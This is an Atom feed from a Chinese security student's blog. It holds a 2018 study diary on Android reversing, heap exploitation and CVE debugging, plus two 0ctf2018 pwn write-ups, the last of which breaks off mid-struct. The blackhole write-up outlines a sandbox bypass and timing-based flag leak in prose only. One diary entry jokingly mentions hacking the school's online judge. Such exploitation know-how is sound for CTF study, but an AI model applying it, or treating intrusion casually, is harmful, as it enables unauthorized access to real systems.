<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sakuraのblog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://eternalsakura13.com/"/>
  <updated>2018-04-02T21:08:58.000Z</updated>
  <id>http://eternalsakura13.com/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sakuraのdiary</title>
    <link href="http://eternalsakura13.com/2099/09/18/study/"/>
    <id>http://eternalsakura13.com/2099/09/18/study/</id>
    <published>2099-09-18T14:05:42.000Z</published>
    <updated>2018-04-02T21:08:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2018-1-28"><a href="#2018-1-28" class="headerlink" title="2018-1-28"></a>2018-1-28</h2><p>1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）<br>2.配置shadow<br>尝试用gdb和gdbserver来调试<br><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a><br><a href="https://developer.android.com/ndk/downloads/index.html?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads/index.html?hl=zh-cn</a><br><a href="http://kiya.studio/2017/06/21/android-gdb/" target="_blank" rel="noopener">http://kiya.studio/2017/06/21/android-gdb/</a><br>shadow文档的几个坑点</p><ul><li>arm-linux-androideabi-gdb，也就是gdb-arm版没有提供，要自己找，我装了一个ndk r10e，然后弄了一个，嗯，r11移除了gdb。</li><li>在gdb remote之前，文档里没有写forward转发，导致我试的时候一直refuse</li></ul><p>3.晚上最大的收获是看到了一个不错的blog（android逆向CTF）<br><a href="http://kiya.studio/2333/03/03/android-reversing-skills/#more" target="_blank" rel="noopener">http://kiya.studio/2333/03/03/android-reversing-skills/#more</a></p><h2 id="2018-1-29"><a href="#2018-1-29" class="headerlink" title="2018-1-29"></a>2018-1-29</h2><ol><li>看玄武的<a href="https://mp.weixin.qq.com/s/mOaXkGTY2704P6TV2KBvwg" target="_blank" rel="noopener">每日安全推送</a>，主要看了WinAFL</li><li>nexus5被我刷成砖……然后顺手把刷机、root和装xposed全都整理了一遍。</li><li>webkit的poc断点找到了，可以调了</li><li>做了一道阿里CTF第二题，一道关于反调试的题。</li></ol><h2 id="2018-1-31"><a href="#2018-1-31" class="headerlink" title="2018-1-31"></a>2018-1-31</h2><ol><li>看AI直播调webkit，感觉调浏览器好难呀。</li><li>看玄武的<a href="https://mp.weixin.qq.com/s/M4QZxs_G-lZ810o_i2KJhA" target="_blank" rel="noopener">每日安全推送</a>，主要关注了反调试和使用Strava 热力图来推断军事基地位置，很有趣的思路。</li><li>研究了一下加固原理和脱壳基础：dvmDexFileOpenPartial，还挺简单的。</li><li>研究了ptrace和调试器原理，了解了ptrace反调试的一些技巧</li></ol><h2 id="2018-2-1"><a href="#2018-2-1" class="headerlink" title="2018-2-1"></a>2018-2-1</h2><ol><li>本来想今天研究一下ndk编译的，不过睡着了……然后也没看什么东西</li><li>帮学弟解决了一些搭建博客的bug，顺便自己把博客的主题配色，代码高亮，搜索，评论什么的都修改或添加了，好看多了……</li></ol><h2 id="2018-2-2"><a href="#2018-2-2" class="headerlink" title="2018-2-2"></a>2018-2-2</h2><ol><li>看玄武的<a href="https://xuanwulab.github.io/cn/secnews/2018/02/02/index.html" target="_blank" rel="noopener">每日安全推送</a></li><li>钓鱼网站那个很有趣，我就测试了一下，然后因为ss代理不走终端，找了<a href="https://juejin.im/entry/5821840cd203090055134cc0" target="_blank" rel="noopener">一篇文章</a>和<a href="https://blog.kelu.org/tech/2017/07/06/parallels-vm-use-proxy-with-host-on-mac.html" target="_blank" rel="noopener">另一篇文章</a>，配置了一下就好了~</li><li>自己实践了一下那个钓鱼工具，实践文章和终端那个都可以在”杂项”分类里找到</li><li>研究了一下怎么用ndk-build编译一个能在手机上运行的c程序，这样明天就可以尝试hook了</li></ol><h2 id="2018-2-3"><a href="#2018-2-3" class="headerlink" title="2018-2-3"></a>2018-2-3</h2><ol><li>今天没有玄武的推送看~</li><li>研究了android native层hook，算是学到不少东西了。</li></ol><h2 id="2018-2-4"><a href="#2018-2-4" class="headerlink" title="2018-2-4"></a>2018-2-4</h2><ol><li>写了第一个xposed程序~遇到了一些坑，不过还是趟过去了。</li><li>修改nexus5的boot.img,打开系统调试，又坑了我一会。。</li></ol><h2 id="2018-2-5"><a href="#2018-2-5" class="headerlink" title="2018-2-5"></a>2018-2-5</h2><ol><li>今天出去怠惰了（茶）</li><li>xposed继续学习了一下，学会了一些姿势，感觉还是不错的~</li></ol><h2 id="2018-2-6"><a href="#2018-2-6" class="headerlink" title="2018-2-6"></a>2018-2-6</h2><ol><li>研究了怎么搭建shadowsocks服务端和优化，顺便卖了几个~</li><li>自己写了一个基于flask的B/S端口扫描器，代码太难看就不放了（茶</li></ol><h2 id="2018-2-7"><a href="#2018-2-7" class="headerlink" title="2018-2-7"></a>2018-2-7</h2><ol><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/FM-mZh1e8YQP0MWrV1IlVw" target="_blank" rel="noopener">2.6</a>和<a href="https://mp.weixin.qq.com/s/2JMrsyyuTErVy-pXRoL3Jg" target="_blank" rel="noopener">2.7</a><br>wordpress DOS有点意思，不过没搞懂，另外主要看了android安全公告2月版，看懂了一些（限于原理），开发太菜了。</li><li>学习了android的jni开发，基本的都摸了一遍。</li></ol><h2 id="2018-2-8"><a href="#2018-2-8" class="headerlink" title="2018-2-8"></a>2018-2-8</h2><ol><li>继续昨天的jni学习，摸清了native方法的动态注册</li><li>研究了下.init_array,结合jni动态注册，做了一道CTF题</li><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/sqPmC-z-HiH4UKArE1Gdgw" target="_blank" rel="noopener">2.8</a>,这篇<a href="https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html" target="_blank" rel="noopener">钓鱼</a>的有趣</li><li>给AI写了个爬页面上文件的爬虫。</li></ol><h2 id="2018-2-9"><a href="#2018-2-9" class="headerlink" title="2018-2-9"></a>2018-2-9</h2><ol><li>研究android构建过程，Gradle工作流程</li><li>读玄武每日推送（存了个移动端静态分析的github准备好好看看）</li></ol><h2 id="2018-2-10"><a href="#2018-2-10" class="headerlink" title="2018-2-10"></a>2018-2-10</h2><ol><li>研究Dex文件格式和修复</li><li>学习了用ddms来dump出运行内存做题的技巧。</li><li>学习了新建android工程，调so文件解题。</li></ol><h2 id="2018-2-11"><a href="#2018-2-11" class="headerlink" title="2018-2-11"></a>2018-2-11</h2><ol><li>把昨天看到一道递归算法的android re做了，感觉现在做一般的CTF都有点思路了，做看雪的还是GG，还要提高姿势水平。</li><li>今天上午看到我在知乎的提问有师傅回答我了：<a href="https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。" target="_blank" rel="noopener">https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。</a></li><li>今天下午做完题就又瞎看了一会，思考我是不是选错了方向……android的调试贼麻烦，资料还贼少，看了看看雪，主要是浏览器、文件格式和内核，虽然其实都一样的，那些资料也不多，没法挖洞的……认识的dalao又少，没法充分交流QAQ，唉，感觉我是不是不适合当黑客，看vulcan的师傅微博，月月一大批CVE，就我什么都挖不到，不过今晚看了看师傅们的博客，他们的心路历程给了我很大勇气，是的，我早就不打算退后了，只有前进而已。</li></ol><h2 id="2018-2-12"><a href="#2018-2-12" class="headerlink" title="2018-2-12"></a>2018-2-12</h2><ol><li>今天刷空间看到moctf比赛，就参加了下，把android/linux re做掉就没看了。</li><li>依然很迷茫，不过其实想想，我开始学二进制，其实也就不到半年，进步速度并不是不能接受，只是在技能进阶上卡住了又没人交流而已，嗯，再想想好了。</li></ol><h2 id="2018-2-13到19"><a href="#2018-2-13到19" class="headerlink" title="2018-2-13到19"></a>2018-2-13到19</h2><ol><li>这些天几乎都过年去了……然后唯一做了点事就是把自己的课程设计做了，<a href="https://github.com/eternalsakura/PortScan" target="_blank" rel="noopener">PortScan</a></li><li>新年新气象，最近家里的事情也是乱七八糟，能多学点赚钱的技术分担压力就好了。</li><li>下学期的计划——fuzz、CVE漏洞研究、前端后端的一些Web开发（写点相关项目练手），然后找实习。</li><li>学会了一项新的运动，保龄球，很有意思。</li><li>最近一直什么都没学，自己也在反思一些东西，寻找一个前进的点。<br>比如浏览器，文件格式，还是内核，或者其他，还是都不是。<br>安全只是个抽象的概念，具体化了才能变成业务。<br>我还需要探究一段时间，读很多的漏洞分析文章，追随前辈们走过的路途，再进一步反思。<br>“一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&gt; exploitable bug(vulnerability) –&gt; poc –&gt; exploit –&gt; reliable/weaponized exploit。虽然大家都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但我们真正关心的漏洞应该是能到最后两个阶段的vulnerability。”</li></ol><h2 id="2018-2-20到21"><a href="#2018-2-20到21" class="headerlink" title="2018-2-20到21"></a>2018-2-20到21</h2><ol><li>返校真是艰难……飞机火车客车出租全都转了一遍才到……</li><li>晚上收拾了下房间，看了看看雪，发现师傅做的有趣CTF题，<a href="https://bbs.pediy.com/thread-224686.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224686.htm</a></li><li>群里在讨论内存管理和hook，被推荐了一本腾讯的手游安全的书《游戏安全：手游安全技术入门》，还不错，可以入个门……</li><li>看到一个博客提供了一些自定义ROM的资料，最近也想改，看到了就记录一下。<a href="https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338" target="_blank" rel="noopener">https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338</a></li></ol><h2 id="2018-2-22"><a href="#2018-2-22" class="headerlink" title="2018-2-22"></a>2018-2-22</h2><ol><li>看了《手游安全技术那本书》，学习了注入技术。</li><li>下午买了考虫的口语能力提升班，然后学习了下</li><li>晚上在seebug逛，找各种二进制漏洞分析的资料，然后看到了陈良的ppt,remet的github,韩子诺的文章，还有很多很多……CVE-2014-7911感觉可以调调，我得整理整理我搜的资料，然后按照原理-&gt;漏洞分析-&gt;exp去学习w</li></ol><h2 id="2018-2-23到25"><a href="#2018-2-23到25" class="headerlink" title="2018-2-23到25"></a>2018-2-23到25</h2><ol><li>是的，仔细算算，我已经编译AOSP编译了三天了，而且还没编译好……现在已经基本放弃在mac上编译了，我现在突然想,flanker大神之所以用ubuntu做主力机……是不是因为在mac上编译不出AOSP呀……(逃)</li><li>明天在旧电脑上装win/ubuntu的双系统，要不是因为这学期有win网络编程和c#开发……我就直接烧ubuntu进去了（撑脸</li><li>嗯，不用明天了，在今天的收尾……新学期的开始……我终于是守得云开见月明，把AOSP弄出来了！</li></ol><h2 id="2018-2-26"><a href="#2018-2-26" class="headerlink" title="2018-2-26"></a>2018-2-26</h2><ol><li>学习了stack pivot，<a href="http://tacxingxing.com/2017/05/10/stack-pivot/" target="_blank" rel="noopener">劫持栈指针</a></li><li>学习了heap spray,<a href="http://secwiki.neu.edu.cn/wiki/images/f/fe/%E5%86%85%E5%AD%98%E5%96%B7%E5%B0%84%E5%9C%A8%E5%AE%89%E5%8D%93Root%E5%88%A9%E7%94%A8%E4%B8%AD_%E9%99%88%E8%89%AF.pdf" target="_blank" rel="noopener">堆喷</a></li><li>学习了<a href="http://pwn4.fun/2016/11/20/C-虚函数调用攻防战/" target="_blank" rel="noopener">虚表攻防</a></li><li>了解android<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back.pdf" target="_blank" rel="noopener">root</a></li><li>Time-of-check Time-of-use (TOCTOU) Race Condition</li><li>今天还是认真的研究了一下之前没调出来的cve-2015-3864，因为这个漏洞有完整的利用链资料，非常的棒，虽然可能调不了什么的，但是理解这个利用过程也很有意义。<br>还是要感谢一下看雪师傅的<a href="https://bbs.pediy.com/thread-222893.htm" target="_blank" rel="noopener">文章</a>，还加了好友0.0，感觉要是我一开始就是编译的AOSP去调试……可能寒假就调出来了2333，反正感觉今天还是很有收获的。</li></ol><h2 id="2018-2-27"><a href="#2018-2-27" class="headerlink" title="2018-2-27"></a>2018-2-27</h2><ol><li>一上午调了道64位rop，还没调出来..exm???是这题的错还是我的错…多看看别人的exp好了，以前还是做题不够，积累不够。</li><li>继续看stagefright好了，争取今天多少调一调。</li><li>好吧，没看进去，gp0的exp大致看懂了，不过metaphor的思路还是费解，可能我现在的理解力还是不够。</li><li>下午一直在整理之前看的ptmalloc的一些基本概念，虽然意义不是很大，但是理一理总是好的，还是要为ctf-wiki打call，里面写了非常多的干货，明天继续整理。</li></ol><h2 id="2018-2-28"><a href="#2018-2-28" class="headerlink" title="2018-2-28"></a>2018-2-28</h2><ol><li>体育课累死……密码学数学基础有趣。</li><li>今天把heap exploit的unlink整理了一下，虽然最后那个例子有点问题，我换了两个系统都没成功，但是原理还是理清了，真的是都快忘了……</li></ol><h2 id="2018-3-1"><a href="#2018-3-1" class="headerlink" title="2018-3-1"></a>2018-3-1</h2><p>1. 又混了篇看雪的优秀，感觉还是蛮有成就感的，自己发的文章都不是优秀就是精品。</p><ol><li>今天有点怠惰呢，明天要继续努力。</li></ol><h2 id="2018-3-2"><a href="#2018-3-2" class="headerlink" title="2018-3-2"></a>2018-3-2</h2><ol><li>今天一天都在整理fastbin的一个内容（其实还玩了一会Web，黑掉学校OJ嘿嘿嘿）</li><li>这道赛题略难，然后跟团队练习赛的PragyanCTF，感觉这赛题像是file io啊。。谁出的题这么皮。。</li></ol><h2 id="2018-3-3"><a href="#2018-3-3" class="headerlink" title="2018-3-3"></a>2018-3-3</h2><p>1. 生日快乐~自己，去订了蛋糕，今天继续研究了一下那个fastbin的题，真的很难。。</p><ol><li>把android kernel也编译了出来，这次真的是可以调了。。</li></ol><h2 id="2018-3-4"><a href="#2018-3-4" class="headerlink" title="2018-3-4"></a>2018-3-4</h2><ol><li>今天和实验室大一的聊了下，然后把我能知道的东西，方向什么的，都聊了一下。</li><li>9447 CTF 2015的fastbin是真的难……我还是不懂，算了算了，明天看点别的吧，这个todo。</li><li>今天和一个师傅聊了下IoT漏洞应该怎么挖，受益匪浅，但是转换为具体的硬实力还需要多看多学多调。</li></ol><h2 id="2018-3-5"><a href="#2018-3-5" class="headerlink" title="2018-3-5"></a>2018-3-5</h2><ol><li>今天把那道fastbin的题认真的理了理，其实也不是很难，然后又把pragyan ctf2018的两道pwn题做了一下，第一道还好，那个目录遍历没理解上，看了wp会了，第二道就有点迷，静态链接下的格式化字符串漏洞，没办法覆盖got表，看了一篇wp是覆盖malloc_hook，这不是我白天看的那道fastbin的套路么……真的是……然后打开栈执行，这……真是脑洞，又感觉自己很菜……</li><li>嗯w，文章又被看雪推送了，还是感觉蛮不错的……希望能认识更多人吧w，今天看了看玄武每日推送的目录，非常nice，准备找个时间把这段时间没看的都啃一下。</li></ol><h2 id="2018-3-6"><a href="#2018-3-6" class="headerlink" title="2018-3-6"></a>2018-3-6</h2><ol><li>上周的比赛，搞到今天总算是大致调完了，就只剩一个点不懂，也是实在搞不懂了，教主说的很有道理，只有把文章写成博客，发出去，才能检验你到底对这个东西的理解怎么样，事实上，也只有在学习中的我，才会如此详细的写wp吧。</li></ol><h2 id="2018-3-7-8"><a href="#2018-3-7-8" class="headerlink" title="2018-3-7-8"></a>2018-3-7-8</h2><ol><li>这两天把漏洞战争的环境大致搭了一下，从用windbg到看到符号，还是折腾了一下。</li></ol><h2 id="2018-3-9-10"><a href="#2018-3-9-10" class="headerlink" title="2018-3-9-10"></a>2018-3-9-10</h2><ol><li>调了一下漏洞战争堆的第一个binary，然后熟悉了一下工具使用，还是nice.</li><li>调了cve-2012-1876的poc，发现了一些书上没有提到的地方和一个错误，就不提勘误了…都出了这么久了…原理差不多懂了，很有趣。</li><li>今天有意想不到的收获，或者说机会吧，希望我能把握好，然后做好安全研究，成为一个优秀的黑客。</li><li>列一个CVE调试计划吧，目前进度1/10<br>浏览器<br>3.7 CVE-2012-1876,堆溢出（p2o ie9)<br>4.3 CVE-2011-0027,整数溢出漏洞 (p2o ie8)<br>4.6 CVE-2013-2551,整数溢出漏洞(p2o ie10)<br>7.4 CVE-2013-1347,UAF(ie)<br>android<br>10.7 CVE-2014-3153 anroid kernel提权</li></ol><h2 id="2018-3-11-12"><a href="#2018-3-11-12" class="headerlink" title="2018-3-11-12"></a>2018-3-11-12</h2><ol><li>这两天进度比较低迷，第一天直接莽上去调exp然后被打脸…今天把vupen的文章仔细读了一遍，把整个利用过程理解了一下。</li><li>说来有个有趣的点，p2o之后cve-2012-1876不是应该补了么，怎么在win8+ie10上还能利用，更有趣的是vupen明明用这个洞getshell了ie9，但是为什么keen在Study of Exploit Migitation in Modern Browsers这个ppt上说了bstr的分配不再能被利用，那vupen到底是怎么写的exp…</li><li>最近的计划（才怪…</li></ol><ul><li>编译的前端后端</li><li>kernel的漏洞</li><li>看diff写poc…</li></ul><h2 id="2018-3-13-14"><a href="#2018-3-13-14" class="headerlink" title="2018-3-13-14"></a>2018-3-13-14</h2><ol><li>密码学数学基础和算法这些课也就算了，晚上还有软件开发的课，各种文档什么的…能不能好好lu代码，把之前写的项目project答辩完了。</li><li>等到了想等的结果，收心认真学习了。</li><li>晚上把计算机系统素养里的部分内容（VM）又看了一下，十分有意义。</li><li>为了学编译原理，先自己lu一个c语言解释器了解个大概吧。</li></ol><h2 id="2018-3-15-17"><a href="#2018-3-15-17" class="headerlink" title="2018-3-15-17"></a>2018-3-15-17</h2><ol><li>这几天把write a c interpret看完了，大致了解了编译器前后端，当然肯定现在还是不会写的。</li><li>调cve-2012-7864,虽然称不上调通exp，但是大部分都调出来了，poc调的很顺利，在exp就处处踩坑。</li><li>说来好像webkit的dom的堆被分开了，以后就不会有那么多uaf了。</li></ol><h2 id="2018-3-18-20"><a href="#2018-3-18-20" class="headerlink" title="2018-3-18-20"></a>2018-3-18-20</h2><ol><li>日记还是要每天记……都忘了自己每天做了什么了……把c++的project做完了，做了两道pwn题。</li><li>看了一下LCTF2017的题目,large bin的unlink确实没练过，还有一道simpleVM改的题，都做做好了。</li></ol><h2 id="2018-3-21-25"><a href="#2018-3-21-25" class="headerlink" title="2018-3-21-25"></a>2018-3-21-25</h2><p>lctf2017的题目里学到不少东西，另外关于堆利用的姿势实在是不足，此外无libc利用这个也要再学习一下。<br>这几天除了两个project写，还打了强网杯，感觉就是什么都不会吧。。可能不该死磕一道题，应该都看看？…啊啊啊，难受死了，离顶尖水平差的根本不是一点半点……<br>还看了一篇清华的论文，非常nice。<a href="http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1</a><br>还是有的挫败呢，离别人的水平。</p><h2 id="2018-3-26"><a href="#2018-3-26" class="headerlink" title="2018-3-26"></a>2018-3-26</h2><p>1.读玄武每日推送[<a href="http://chuansong.me/n/2253059751415" target="_blank" rel="noopener">http://chuansong.me/n/2253059751415</a>].</p><ul><li>mark一下<a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" target="_blank" rel="noopener">windows kernel漏洞利用</a>，mark一下k0师傅的<a href="https://whereisk0shl.top/post/2018-03-21" target="_blank" rel="noopener">UBUNTU 16.04 EBPF ARBITRARY READ/WRITE 漏洞分析</a>和360src的<a href="https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11" target="_blank" rel="noopener">这篇</a>,看来调kernel还是有的调。</li><li>看到的<a href="https://github.com/sashs/arm_exploitation/blob/master/exploitation_on_arm_based_systems.pdf" target="_blank" rel="noopener">ARM exp开发</a>就很简略，感觉学不到什么东西。</li><li>mark一个超棒的<a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">linux kernel交互图</a>，还能在页面上点击跳转到资料<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-LKM3_2048.png" alt=""></li><li>还有一个Stack pivoting  exploit的图收了,不知道他们怎么画的图这么好看。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-030340.jpg" alt=""></li><li><a href="https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5a00963153450a8779b23489/1509987890282/Windows" target="_blank" rel="noopener">windows注册表审计</a>感觉以后用得到</li><li><a href="https://twitter.com/_niklasb/status/977141034059747328" target="_blank" rel="noopener">p2o的沙盒逃逸漏洞</a>这个感觉十分有意思。</li><li>blackhat上总有很多好议题，比如这个<a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">绕过ASLR的新思路</a></li></ul><p>2.准备配linux kernel的调试环境，真的是……配不起来啊，双机调试，拉取符号文件，设置串口，改配置开启调试功能。rbq,rbq<br>3.加入了chamd5团队，有师傅一起学pwn，一起讨论真是太棒了QVQ</p><h2 id="2018-3-27"><a href="#2018-3-27" class="headerlink" title="2018-3-27"></a>2018-3-27</h2><ol><li><p>上午和出强网杯kernel题的师傅聊了一下kernel的调试环境搭建和赛题，师傅人蛮好。。<br>搭建的话，muhe师傅的<a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85837</a><br><strong>编译linux 注意去掉不必要的东西，然后编译busybox 然后插入内核  写linux init 最后制作cpio</strong><br>这样就可以qemu+gdb调试了，很nice。</p></li><li><p>下午和晚上忙各种杂七杂八的事情反正……不过总算还是把要复盘的赛题做完了。</p></li><li>另外，感觉自己的努力和天赋还是被人肯定的，加油吧，自己QVQ。</li></ol><h2 id="2018-3-28"><a href="#2018-3-28" class="headerlink" title="2018-3-28"></a>2018-3-28</h2><ol><li>人生这种东西，其实就是起起落落落落落落落落落落落落落落落落落落落落落落落落落落落落，23333<br>瞎看了半天linux inside，还看了下linux x86-64 asm，感觉没什么进展。</li><li>晚上在知乎提了个问题，别人指了一条很nice的路线给我，还和其他人get了一点点资料，感觉我应该也是可以搞的吧，嗯哼。<br>其实今天一直比较浮躁，还是昨天晚上的一些后遗症吧，还有就是期望和现实的落差……<br>不过冷静的回想一下，不能让自己立刻从舒适区脱离，从新掌握新的知识，那怎么进步呢？且行且努力（乖巧</li></ol><h2 id="2018-3-29"><a href="#2018-3-29" class="headerlink" title="2018-3-29"></a>2018-3-29</h2><ol><li>这几天事挺多的，今天才把blackhat的ppt都下载下来,然后看了下<a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488" target="_blank" rel="noopener">linux符号解析</a>还发现了一个<a href="https://github.com/elfmaster/skeksi_virus" target="_blank" rel="noopener">正在开发中的linux病毒</a></li><li>收集了蛮多linux kernel资料慢慢啃……今天啃了两个ppt，纯英文的那么多……我也是很意外自己读起来没什么障碍的……<br>学什么都要一步一步呀，能调通一个，调试就没什么了，后面的学习速度就看对于kernel和保护的理解了。</li></ol><h2 id="2018-3-30-31"><a href="#2018-3-30-31" class="headerlink" title="2018-3-30-31"></a>2018-3-30-31</h2><ol><li>这两天发生的事情还蛮多的，最近发生的一些事让我觉得，自己调的真洞还是太少，调就要调出来还要能调通，不过说实话吧……浏览器和kernel的洞真的不好调，我学二进制又不久……现在比赛练pwn都来不及，还要分身调洞，确实有点难啊……</li><li>不过kernel的ppt啃了俩，感觉纯英文的资料也就那个样子了，读起来还是挺流畅的，要是真的不懂换成中文我也不懂……</li><li>把kernel题的环境搭起来了，有师傅请教真的是比自己搞好太多……另外堆的题感觉有感觉了，准备给自己一个比较长的训练周期，比如十天，彻底脑内模拟透，最近进步还是蛮多，加油。<br>mark一个师傅的<a href="http://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">博客</a></li></ol><h2 id="2018-4-1-3"><a href="#2018-4-1-3" class="headerlink" title="2018-4-1-3"></a>2018-4-1-3</h2><ol><li>打了一场0ctf，感觉自己还是太菜，不过在师傅们的帮助下，把能搞懂的题都搞懂了，学到很多很多东西，还是很开心的。</li><li>写wp太麻烦了坦白说。。不过还是写吧，不写的话自己都不知道能记得多久……</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;2018-1-28&quot;&gt;&lt;a href=&quot;#2018-1-28&quot; class=&quot;headerlink&quot; title=&quot;2018-1-28&quot;&gt;&lt;/a&gt;2018-1-28&lt;/h2&gt;&lt;p&gt;1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）&lt;br&gt;2
      
    
    </summary>
    
      <category term="学习日记" scheme="http://eternalsakura13.com/categories/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>0ctf2018 blackhole writeup</title>
    <link href="http://eternalsakura13.com/2018/04/03/blackhole/"/>
    <id>http://eternalsakura13.com/2018/04/03/blackhole/</id>
    <published>2018-04-02T20:55:09.212Z</published>
    <updated>2018-04-02T21:06:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/blackhole.tar.gz" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/blackhole.tar.gz</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这题和babystack是一样的，除了变成了64位，也是完全没有可以用来输出的函数。<br>而且，这题还设置了沙箱，限制了能够执行的系统调用为mprotect/read/write/exit。<br>所以说没办法getshell，只能一点一点的把flag给“注入”出来。</p><p>思路是先弄出一个syscall gadget,调一下mprotect，读进来shellcode就可以随便操作了。<br>sc逻辑的话，就把flag读进来，然后一个bit一个bit去爆破..<br>相当于sql盲注那样..可以构造个if flag[x]==’a’ sleep else exit..这样</p><p>另外，要想要调用系统调用，可以通过在got表地址里面写掉一个低Byte，从而可以可以跳转到附近的函数去，这里就是系统调用，如图。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-205935.jpg" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>TODO<br>TODO<br>TODO<br>应该会写吧……嗯……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接&quot;&gt;&lt;/a&gt;题目链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/eternalsakura/ctf_pwn/blob/master/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="其他" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="ret2csu" scheme="http://eternalsakura13.com/tags/ret2csu/"/>
    
  </entry>
  
  <entry>
    <title>0ctf2018 babyheap writeup</title>
    <link href="http://eternalsakura13.com/2018/04/03/babyheap/"/>
    <id>http://eternalsakura13.com/2018/04/03/babyheap/</id>
    <published>2018-04-02T18:03:34.230Z</published>
    <updated>2018-04-02T20:37:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/babyheap.tar.gz" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/babyheap.tar.gz</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>off-by-one</li><li>overlap</li><li>熟悉malloc_state即main_arena,即知道main_arena是存储在libc.so的一个数据段。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span 